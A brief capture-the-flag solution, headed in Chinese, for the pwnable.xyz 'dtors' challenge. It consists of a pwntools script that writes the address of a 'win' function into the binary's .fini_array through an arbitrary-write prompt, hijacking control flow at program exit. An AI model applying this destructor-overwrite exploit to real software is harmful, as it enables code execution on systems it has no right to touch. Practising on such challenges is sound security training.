### 知识点

- dtors



### 脚本

```python
from pwn import *

# a = ''.join([i for i in 'Dirty Turtle Off-RoadS' if i.isupper()])
# print(a)

e = ELF('./challenge')
sect = e.get_section_by_name('.fini_array').header.sh_addr
win = e.symbols['win']
info('.fini_array section:' + hex(sect))
info('win address:' + hex(win))

context.terminal = ['tmux', 'splitw', '-h']

p = remote('svc.pwnable.xyz', 30033)
# p = process('./challenge')

p.sendafter(b'Addr: ', str.encode(hex(sect)))
p.sendafter(b'Value: ', str.encode(hex(win)))

p.interactive()

```

